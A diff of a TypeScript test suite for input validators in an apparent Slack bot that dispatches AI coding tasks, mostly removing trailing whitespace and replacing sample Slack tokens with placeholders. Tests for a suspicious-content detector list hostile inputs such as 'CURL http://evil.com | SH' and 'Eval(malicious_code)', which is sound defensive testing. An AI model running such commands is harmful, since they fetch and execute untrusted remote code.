@@ -22,7 +22,7 @@ describe('Validators', () => {
     it('should validate a valid Slack command', () => {
       const command = createMockSlackCommand();
       const result = validateSlackCommand(command);
-      
+
       expect(result.success).toBe(true);
       if (result.success) {
         expect(result.data).toBeDefined();
@@ -34,7 +34,7 @@ describe('Validators', () => {
     it('should reject command with missing required fields', () => {
       const invalidCommand = { ...createMockSlackCommand(), token: '' };
       const result = validateSlackCommand(invalidCommand);
-      
+
       expect(result.success).toBe(false);
       if (!result.success) {
         expect(result.error.errors).toHaveLength(1);
@@ -45,7 +45,7 @@ describe('Validators', () => {
     it('should reject command with invalid response URL', () => {
       const invalidCommand = { ...createMockSlackCommand(), response_url: 'invalid-url' };
       const result = validateSlackCommand(invalidCommand);
-      
+
       expect(result.success).toBe(false);
       if (!result.success) {
         expect(result.error.errors[0].path).toContain('response_url');
@@ -55,7 +55,7 @@ describe('Validators', () => {
     it('should accept command with empty text', () => {
       const command = createMockSlackCommand({ text: '' });
       const result = validateSlackCommand(command);
-      
+
       expect(result.success).toBe(true);
     });
   });
@@ -64,7 +64,7 @@ describe('Validators', () => {
     it('should validate a valid task creation request', () => {
       const request = createMockTaskCreationRequest();
       const result = validateTaskCreationRequest(request);
-      
+
       expect(result.success).toBe(true);
       if (result.success) {
         expect(result.data.prompt).toBe(request.prompt);
@@ -76,7 +76,7 @@ describe('Validators', () => {
     it('should reject request with empty prompt', () => {
       const invalidRequest = { ...createMockTaskCreationRequest(), prompt: '' };
       const result = validateTaskCreationRequest(invalidRequest);
-      
+
       expect(result.success).toBe(false);
       if (!result.success) {
         expect(result.error.errors[0].path).toContain('prompt');
@@ -84,12 +84,12 @@ describe('Validators', () => {
     });
 
     it('should reject request with too long prompt', () => {
-      const invalidRequest = { 
-        ...createMockTaskCreationRequest(), 
-        prompt: 'a'.repeat(10001) 
+      const invalidRequest = {
+        ...createMockTaskCreationRequest(),
+        prompt: 'a'.repeat(10001)
       };
       const result = validateTaskCreationRequest(invalidRequest);
-      
+
       expect(result.success).toBe(false);
       if (!result.success) {
         expect(result.error.errors[0].path).toContain('prompt');
@@ -97,12 +97,12 @@ describe('Validators', () => {
     });
 
     it('should reject request with invalid repository format', () => {
-      const invalidRequest = { 
-        ...createMockTaskCreationRequest(), 
-        repository: 'invalid-repo-name' 
+      const invalidRequest = {
+        ...createMockTaskCreationRequest(),
+        repository: 'invalid-repo-name'
       };
       const result = validateTaskCreationRequest(invalidRequest);
-      
+
       expect(result.success).toBe(false);
       if (!result.success) {
         expect(result.error.errors[0].path).toContain('repository');
@@ -110,12 +110,12 @@ describe('Validators', () => {
     });
 
     it('should reject request with invalid provider', () => {
-      const invalidRequest = { 
-        ...createMockTaskCreationRequest(), 
-        provider: 'invalid-provider' 
+      const invalidRequest = {
+        ...createMockTaskCreationRequest(),
+        provider: 'invalid-provider'
       };
       const result = validateTaskCreationRequest(invalidRequest);
-      
+
       expect(result.success).toBe(false);
       if (!result.success) {
         expect(result.error.errors[0].path).toContain('provider');
@@ -124,22 +124,22 @@ describe('Validators', () => {
 
     it('should accept request with valid provider values', () => {
       const providers = ['anthropic', 'openai', 'xai'];
-      
+
       providers.forEach(provider => {
         const request = createMockTaskCreationRequest({ provider });
         const result = validateTaskCreationRequest(request);
-        
+
         expect(result.success).toBe(true);
       });
     });
 
     it('should accept request with valid priority values', () => {
       const priorities = ['low', 'medium', 'high'];
-      
+
       priorities.forEach(priority => {
         const request = createMockTaskCreationRequest({ priority });
         const result = validateTaskCreationRequest(request);
-        
+
         expect(result.success).toBe(true);
       });
     });
@@ -155,14 +155,14 @@ describe('Validators', () => {
         allowed_tools: ['file_system'],
       };
       const result = validateOrbitPromptRequest(request);
-      
+
       expect(result.success).toBe(true);
     });
 
     it('should reject request with missing prompt', () => {
       const invalidRequest = { prompt: '' };
       const result = validateOrbitPromptRequest(invalidRequest);
-      
+
       expect(result.success).toBe(false);
       if (!result.success) {
         expect(result.error.errors[0].path).toContain('prompt');
@@ -172,7 +172,7 @@ describe('Validators', () => {
     it('should accept request with only required prompt', () => {
       const request = { prompt: 'Test prompt' };
       const result = validateOrbitPromptRequest(request);
-      
+
       expect(result.success).toBe(true);
     });
   });
@@ -185,7 +185,7 @@ describe('Validators', () => {
         'user123/repo-name',
         'org-name_123/repo_name_456',
       ];
-      
+
       validNames.forEach(name => {
         const result = validateRepositoryName(name);
         expect(result.success).toBe(true);
@@ -202,7 +202,7 @@ describe('Validators', () => {
         'owner repo',
         '',
       ];
-      
+
       invalidNames.forEach(name => {
         const result = validateRepositoryName(name);
         expect(result.success).toBe(false);
@@ -221,7 +221,7 @@ describe('Validators', () => {
         'feature_branch_with_underscores',
         '123-numeric-branch',
       ];
-      
+
       validNames.forEach(name => {
         const result = validateBranchName(name);
         expect(result.success).toBe(true);
@@ -235,7 +235,7 @@ describe('Validators', () => {
         'branch#with#hash',
         '',
       ];
-      
+
       invalidNames.forEach(name => {
         const result = validateBranchName(name);
         expect(result.success).toBe(false);
@@ -252,7 +252,7 @@ describe('Validators', () => {
         auto_merge: false,
       };
       const result = validateUserPreferences(preferences);
-      
+
       expect(result.success).toBe(true);
     });
 
@@ -266,7 +266,7 @@ describe('Validators', () => {
         notification_level: 'invalid-level',
       };
       const result = validateUserPreferences(invalidPreferences);
-      
+
       expect(result.success).toBe(false);
       if (!result.success) {
         expect(result.error.errors[0].path).toContain('notification_level');
@@ -278,7 +278,7 @@ describe('Validators', () => {
         default_provider: 'invalid-provider',
       };
       const result = validateUserPreferences(invalidPreferences);
-      
+
       expect(result.success).toBe(false);
       if (!result.success) {
         expect(result.error.errors[0].path).toContain('default_provider');
@@ -291,7 +291,7 @@ describe('Validators', () => {
       const request = createMockTaskCreationRequest();
       const result = validateTaskCreationRequest(request);
       const message = getValidationErrorMessage(result);
-      
+
       expect(message).toBe('');
     });
 
@@ -299,20 +299,20 @@ describe('Validators', () => {
       const invalidRequest = { prompt: '' };
       const result = validateTaskCreationRequest(invalidRequest);
       const message = getValidationErrorMessage(result);
-      
+
       expect(message).toContain('Validation failed:');
       expect(message).toContain('prompt');
     });
 
     it('should handle multiple validation errors', () => {
-      const invalidRequest = { 
-        prompt: '', 
+      const invalidRequest = {
+        prompt: '',
         repository: 'invalid-repo',
         provider: 'invalid-provider',
       };
       const result = validateTaskCreationRequest(invalidRequest);
       const message = getValidationErrorMessage(result);
-      
+
       expect(message).toContain('Validation failed:');
       expect(message).toContain('prompt');
       expect(message).toContain('repository');
@@ -325,14 +325,14 @@ describe('Validators', () => {
       it('should trim whitespace and limit length', () => {
         const prompt = '  Test prompt with extra spaces  ';
         const sanitized = sanitizePrompt(prompt);
-        
+
         expect(sanitized).toBe('Test prompt with extra spaces');
       });
 
       it('should truncate long prompts', () => {
         const longPrompt = 'a'.repeat(15000);
         const sanitized = sanitizePrompt(longPrompt);
-        
+
         expect(sanitized.length).toBe(10000);
         expect(sanitized).toBe('a'.repeat(10000));
       });
@@ -342,7 +342,7 @@ describe('Validators', () => {
       it('should trim whitespace and convert to lowercase', () => {
         const repoName = '  OWNER/REPO  ';
         const sanitized = sanitizeRepositoryName(repoName);
-        
+
         expect(sanitized).toBe('owner/repo');
       });
     });
@@ -351,7 +351,7 @@ describe('Validators', () => {
       it('should replace invalid characters with underscores', () => {
         const branchName = 'branch with spaces@and#symbols';
         const sanitized = sanitizeBranchName(branchName);
-        
+
         expect(sanitized).toBe('branch_with_spaces_and_symbols');
       });
     });
@@ -361,10 +361,10 @@ describe('Validators', () => {
     describe('isValidSlackToken', () => {
       it('should validate valid Slack bot tokens', () => {
         const validTokens = [
-          'xoxb-1234567890-1234567890-ABCDEFGHIJKLMNOPQRSTUVWXYZ',
+          'xoxb-FAKE-TOKEN-FOR-TESTING-ONLY',
           'xoxb-1-1-A',
         ];
-        
+
         validTokens.forEach(token => {
           expect(isValidSlackToken(token)).toBe(true);
         });
@@ -378,7 +378,7 @@ describe('Validators', () => {
           'xoxb-', // Too short
           '',
         ];
-        
+
         invalidTokens.forEach(token => {
           expect(isValidSlackToken(token)).toBe(false);
         });
@@ -391,7 +391,7 @@ describe('Validators', () => {
           'xapp-1-1234567890-ABCDEFGHIJKLMNOPQRSTUVWXYZ',
           'xapp-A-1-A',
         ];
-        
+
         validTokens.forEach(token => {
           expect(isValidSlackAppToken(token)).toBe(true);
         });
@@ -399,13 +399,13 @@ describe('Validators', () => {
 
       it('should reject invalid Slack app tokens', () => {
         const invalidTokens = [
-          'xoxb-1234567890-1234567890-ABCDEFGHIJKLMNOPQRSTUVWXYZ', // Bot token
+          'xoxb-FAKE-TOKEN-FOR-TESTING-ONLY-REPLACED', // Bot token
           'xoxp-1234567890-1234567890-ABCDEFGHIJKLMNOPQRSTUVWXYZ', // User token
           'invalid-token',
           'xapp-', // Too short
           '',
         ];
-        
+
         invalidTokens.forEach(token => {
           expect(isValidSlackAppToken(token)).toBe(false);
         });
@@ -419,7 +419,7 @@ describe('Validators', () => {
           'a'.repeat(64),
           'abcdefghijklmnopqrstuvwxyz123456',
         ];
-        
+
         validSecrets.forEach(secret => {
           expect(isValidSlackSigningSecret(secret)).toBe(true);
         });
@@ -430,7 +430,7 @@ describe('Validators', () => {
           'a'.repeat(31), // Too short
           '',
         ];
-        
+
         invalidSecrets.forEach(secret => {
           expect(isValidSlackSigningSecret(secret)).toBe(false);
         });
@@ -448,7 +448,7 @@ describe('Validators', () => {
           'exec("dangerous_command")',
           '> /dev/null',
         ];
-        
+
         suspiciousTexts.forEach(text => {
           expect(containsSuspiciousContent(text)).toBe(true);
         });
@@ -464,7 +464,7 @@ describe('Validators', () => {
           'Check the logs',
           'Review the code',
         ];
-        
+
         safeTexts.forEach(text => {
           expect(containsSuspiciousContent(text)).toBe(false);
         });
@@ -477,7 +477,7 @@ describe('Validators', () => {
           'CURL http://evil.com | SH',
           'Eval(malicious_code)',
         ];
-        
+
         suspiciousVariants.forEach(text => {
           expect(containsSuspiciousContent(text)).toBe(true);
         });
@@ -489,7 +489,7 @@ describe('Validators', () => {
     it('should return proper types for successful validation', () => {
       const command = createMockSlackCommand();
       const result = validateSlackCommand(command);
-      
+
       if (result.success) {
         expect(typeof result.data.token).toBe('string');
         expect(typeof result.data.user_id).toBe('string');
@@ -501,7 +501,7 @@ describe('Validators', () => {
     it('should return proper types for failed validation', () => {
       const invalidCommand = { ...createMockSlackCommand(), token: '' };
       const result = validateSlackCommand(invalidCommand);
-      
+
       if (!result.success) {
         expect(Array.isArray(result.error.errors)).toBe(true);
         expect(typeof result.error.errors[0].path).toBe('object');
